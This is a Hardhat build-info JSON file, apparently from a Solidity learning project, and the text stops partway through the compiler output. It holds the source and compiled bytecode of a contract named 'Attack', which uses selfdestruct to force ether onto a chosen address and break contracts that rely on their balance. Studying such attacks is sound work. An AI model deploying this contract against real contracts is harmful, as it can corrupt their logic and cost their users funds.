{
	"id": "d6a85cfd54a5e7d1386fd17e68429b97",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.7",
	"solcLongVersion": "0.8.7+commit.e28d00a7",
	"input": {
		"language": "Solidity",
		"sources": {
			"Code-hardhat-ethersJs/contracts/sc.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity >=0.7.0 <0.9.0;\n\n\ncontract Attack {\n   address registerAddress;\n \n   constructor(address _registerAddress) payable {\n       registerAddress = _registerAddress;\n   }\n \n   receive() external payable {}\n    \n   function attack() public payable {\n       address payable addr = payable(address(registerAddress));\n       selfdestruct(addr);\n   }\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"Code-hardhat-ethersJs/contracts/sc.sol": {
				"Attack": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_registerAddress",
									"type": "address"
								}
							],
							"stateMutability": "payable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "attack",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"Code-hardhat-ethersJs/contracts/sc.sol\":66:389  contract Attack {... */\n  mstore(0x40, 0x80)\n    /* \"Code-hardhat-ethersJs/contracts/sc.sol\":117:212  constructor(address _registerAddress) payable {... */\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_1\n  swap2\n  swap1\n  tag_2\n  jump\t// in\ntag_1:\n    /* \"Code-hardhat-ethersJs/contracts/sc.sol\":190:206  _registerAddress */\n  dup1\n    /* \"Code-hardhat-ethersJs/contracts/sc.sol\":172:187  registerAddress */\n  0x00\n  dup1\n    /* \"Code-hardhat-ethersJs/contracts/sc.sol\":172:206  registerAddress = _registerAddress */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"Code-hardhat-ethersJs/contracts/sc.sol\":117:212  constructor(address _registerAddress) payable {... */\n  pop\n    /* \"Code-hardhat-ethersJs/contracts/sc.sol\":66:389  contract Attack {... */\n  jump(tag_5)\n    /* \"#utility.yul\":7:150   */\ntag_7:\n    /* \"#utility.yul\":64:69   */\n  0x00\n    /* \"#utility.yul\":95:101   */\n  dup2\n    /* \"#utility.yul\":89:102   */\n  mload\n    /* \"#utility.yul\":80:102   */\n  swap1\n  pop\n    /* \"#utility.yul\":111:144   */\n  tag_9\n    /* \"#utility.yul\":138:143   */\n  dup2\n    /* \"#utility.yul\":111:144   */\n  tag_10\n  jump\t// in\ntag_9:\n    /* \"#utility.yul\":7:150   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":156:507   */\ntag_2:\n    /* \"#utility.yul\":226:232   */\n  0x00\n    /* \"#utility.yul\":275:277   */\n  0x20\n    /* \"#utility.yul\":263:272   */\n  dup3\n    /* \"#utility.yul\":254:261   */\n  dup5\n    /* \"#utility.yul\":250:273   */\n  sub\n    /* \"#utility.yul\":246:278   */\n  slt\n    /* \"#utility.yul\":243:362   */\n  iszero\n  tag_12\n  jumpi\n    /* \"#utility.yul\":281:360   */\n  tag_13\n  tag_14\n  jump\t// in\ntag_13:\n    /* \"#utility.yul\":243:362   */\ntag_12:\n    /* \"#utility.yul\":401:402   */\n  0x00\n    /* \"#utility.yul\":426:490   */\n  tag_15\n    /* \"#utility.yul\":482:489   */\n  dup5\n    /* \"#utility.yul\":473:479   */\n  dup3\n    /* \"#utility.yul\":462:471   */\n  dup6\n    /* \"#utility.yul\":458:480   */\n  add\n    /* \"#utility.yul\":426:490   */\n  tag_7\n  jump\t// in\ntag_15:\n    /* \"#utility.yul\":416:490   */\n  swap2\n  pop\n    /* \"#utility.yul\":372:500   */\n  pop\n    /* \"#utility.yul\":156:507   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":594:690   */\ntag_18:\n    /* \"#utility.yul\":631:638   */\n  0x00\n    /* \"#utility.yul\":660:684   */\n  tag_20\n    /* \"#utility.yul\":678:683   */\n  dup3\n    /* \"#utility.yul\":660:684   */\n  tag_21\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":649:684   */\n  swap1\n  pop\n    /* \"#utility.yul\":594:690   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:822   */\ntag_21:\n    /* \"#utility.yul\":733:740   */\n  0x00\n    /* \"#utility.yul\":773:815   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":766:771   */\n  dup3\n    /* \"#utility.yul\":762:816   */\n  and\n    /* \"#utility.yul\":751:816   */\n  swap1\n  pop\n    /* \"#utility.yul\":696:822   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":951:1068   */\ntag_14:\n    /* \"#utility.yul\":1060:1061   */\n  0x00\n    /* \"#utility.yul\":1057:1058   */\n  dup1\n    /* \"#utility.yul\":1050:1062   */\n  revert\n    /* \"#utility.yul\":1074:1196   */\ntag_10:\n    /* \"#utility.yul\":1147:1171   */\n  tag_27\n    /* \"#utility.yul\":1165:1170   */\n  dup2\n    /* \"#utility.yul\":1147:1171   */\n  tag_18\n  jump\t// in\ntag_27:\n    /* \"#utility.yul\":1140:1145   */\n  dup2\n    /* \"#utility.yul\":1137:1172   */\n  eq\n    /* \"#utility.yul\":1127:1190   */\n  tag_28\n  jumpi\n    /* \"#utility.yul\":1186:1187   */\n  0x00\n    /* \"#utility.yul\":1183:1184   */\n  dup1\n    /* \"#utility.yul\":1176:1188   */\n  revert\n    /* \"#utility.yul\":1127:1190   */\ntag_28:\n    /* \"#utility.yul\":1074:1196   */\n  pop\n  jump\t// out\n    /* \"Code-hardhat-ethersJs/contracts/sc.sol\":66:389  contract Attack {... */\ntag_5:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"Code-hardhat-ethersJs/contracts/sc.sol\":66:389  contract Attack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x9e5faafc\n      eq\n      tag_3\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"Code-hardhat-ethersJs/contracts/sc.sol\":256:387  function attack() public payable {... */\n    tag_3:\n      tag_6\n      tag_7\n      jump\t// in\n    tag_6:\n      stop\n    tag_7:\n        /* \"Code-hardhat-ethersJs/contracts/sc.sol\":298:318  address payable addr */\n      0x00\n        /* \"Code-hardhat-ethersJs/contracts/sc.sol\":337:352  registerAddress */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Code-hardhat-ethersJs/contracts/sc.sol\":298:354  address payable addr = payable(address(registerAddress)) */\n      swap1\n      pop\n        /* \"Code-hardhat-ethersJs/contracts/sc.sol\":376:380  addr */\n      dup1\n        /* \"Code-hardhat-ethersJs/contracts/sc.sol\":363:381  selfdestruct(addr) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      selfdestruct\n\n    auxdata: 0xa2646970667358221220896463feb04b1ba95e2f12224930833b6c70c93a13052bcafc616746cc56558864736f6c63430008070033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_13": {
									"entryPoint": null,
									"id": 13,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"abi_decode_t_address_fromMemory": {
									"entryPoint": 107,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_address_fromMemory": {
									"entryPoint": 128,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 173,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 191,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 223,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_address": {
									"entryPoint": 228,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:1199:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "70:80:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "80:22:1",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "95:6:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "89:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "89:13:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "80:5:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "138:5:1"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nodeType": "YulIdentifier",
																	"src": "111:26:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "111:33:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "111:33:1"
														}
													]
												},
												"name": "abi_decode_t_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "48:6:1",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "56:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "64:5:1",
														"type": ""
													}
												],
												"src": "7:143:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "233:274:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "279:83:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nodeType": "YulIdentifier",
																				"src": "281:77:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "281:79:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "281:79:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "254:7:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "263:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "250:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "250:23:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "275:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "246:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "246:32:1"
															},
															"nodeType": "YulIf",
															"src": "243:119:1"
														},
														{
															"nodeType": "YulBlock",
															"src": "372:128:1",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "387:15:1",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "401:1:1",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "391:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "416:74:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "462:9:1"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "473:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "458:3:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "458:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "482:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address_fromMemory",
																			"nodeType": "YulIdentifier",
																			"src": "426:31:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "426:64:1"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "416:6:1"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "203:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "214:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "226:6:1",
														"type": ""
													}
												],
												"src": "156:351:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "553:35:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "563:19:1",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "579:2:1",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "573:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "573:9:1"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nodeType": "YulIdentifier",
																	"src": "563:6:1"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "546:6:1",
														"type": ""
													}
												],
												"src": "513:75:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "639:51:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "649:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "678:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "660:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "660:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "649:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "621:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "631:7:1",
														"type": ""
													}
												],
												"src": "594:96:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "741:81:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "751:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "766:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "773:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "762:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "762:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "751:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "723:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "733:7:1",
														"type": ""
													}
												],
												"src": "696:126:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "917:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "934:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "937:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "927:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "927:12:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "927:12:1"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nodeType": "YulFunctionDefinition",
												"src": "828:117:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1040:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1057:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1060:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "1050:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1050:12:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1050:12:1"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nodeType": "YulFunctionDefinition",
												"src": "951:117:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1117:79:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1174:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1183:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1186:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "1176:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1176:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1176:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1140:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "1165:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nodeType": "YulIdentifier",
																					"src": "1147:17:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "1147:24:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "1137:2:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1137:35:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1130:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1130:43:1"
															},
															"nodeType": "YulIf",
															"src": "1127:63:1"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1110:5:1",
														"type": ""
													}
												],
												"src": "1074:122:1"
											}
										]
									},
									"contents": "{\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "60806040526040516101b03803806101b083398181016040528101906100259190610080565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100fb565b60008151905061007a816100e4565b92915050565b600060208284031215610096576100956100df565b5b60006100a48482850161006b565b91505092915050565b60006100b8826100bf565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b6100ed816100ad565b81146100f857600080fd5b50565b60a7806101096000396000f3fe608060405260043610601f5760003560e01c80639e5faafc14602a576025565b36602557005b600080fd5b60306032565b005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff16fffea2646970667358221220896463feb04b1ba95e2f12224930833b6c70c93a13052bcafc616746cc56558864736f6c63430008070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0x1B0 CODESIZE SUB DUP1 PUSH2 0x1B0 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x25 SWAP2 SWAP1 PUSH2 0x80 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xFB JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x7A DUP2 PUSH2 0xE4 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x96 JUMPI PUSH2 0x95 PUSH2 0xDF JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xA4 DUP5 DUP3 DUP6 ADD PUSH2 0x6B JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xB8 DUP3 PUSH2 0xBF JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xED DUP2 PUSH2 0xAD JUMP JUMPDEST DUP2 EQ PUSH2 0xF8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0xA7 DUP1 PUSH2 0x109 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1F JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH1 0x2A JUMPI PUSH1 0x25 JUMP JUMPDEST CALLDATASIZE PUSH1 0x25 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x30 PUSH1 0x32 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP10 PUSH5 0x63FEB04B1B 0xA9 0x5E 0x2F SLT 0x22 0x49 ADDRESS DUP4 EXTCODESIZE PUSH13 0x70C93A13052BCAFC616746CC56 SSTORE DUP9 PUSH5 0x736F6C6343 STOP ADDMOD SMOD STOP CALLER ",
							"sourceMap": "66:323:0:-:0;;;117:95;;;;;;;;;;;;;;;;;;;;;:::i;:::-;190:16;172:15;;:34;;;;;;;;;;;;;;;;;;117:95;66:323;;7:143:1;64:5;95:6;89:13;80:22;;111:33;138:5;111:33;:::i;:::-;7:143;;;;:::o;156:351::-;226:6;275:2;263:9;254:7;250:23;246:32;243:119;;;281:79;;:::i;:::-;243:119;401:1;426:64;482:7;473:6;462:9;458:22;426:64;:::i;:::-;416:74;;372:128;156:351;;;;:::o;594:96::-;631:7;660:24;678:5;660:24;:::i;:::-;649:35;;594:96;;;:::o;696:126::-;733:7;773:42;766:5;762:54;751:65;;696:126;;;:::o;951:117::-;1060:1;1057;1050:12;1074:122;1147:24;1165:5;1147:24;:::i;:::-;1140:5;1137:35;1127:63;;1186:1;1183;1176:12;1127:63;1074:122;:::o;66:323:0:-;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@_17": {
									"entryPoint": null,
									"id": 17,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@attack_35": {
									"entryPoint": 50,
									"id": 35,
									"parameterSlots": 0,
									"returnSlots": 0
								}
							},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405260043610601f5760003560e01c80639e5faafc14602a576025565b36602557005b600080fd5b60306032565b005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff16fffea2646970667358221220896463feb04b1ba95e2f12224930833b6c70c93a13052bcafc616746cc56558864736f6c63430008070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1F JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH1 0x2A JUMPI PUSH1 0x25 JUMP JUMPDEST CALLDATASIZE PUSH1 0x25 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x30 PUSH1 0x32 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP10 PUSH5 0x63FEB04B1B 0xA9 0x5E 0x2F SLT 0x22 0x49 ADDRESS DUP4 EXTCODESIZE PUSH13 0x70C93A13052BCAFC616746CC56 SSTORE DUP9 PUSH5 0x736F6C6343 STOP ADDMOD SMOD STOP CALLER ",
							"sourceMap": "66:323:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;256:131;;;:::i;:::-;;;298:20;337:15;;;;;;;;;;;298:56;;376:4;363:18;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "33400",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"attack()": "29845"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 66,
									"end": 389,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 66,
									"end": 389,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 66,
									"end": 389,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 117,
									"end": 212,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 117,
									"end": 212,
									"name": "MLOAD",
									"source": 0
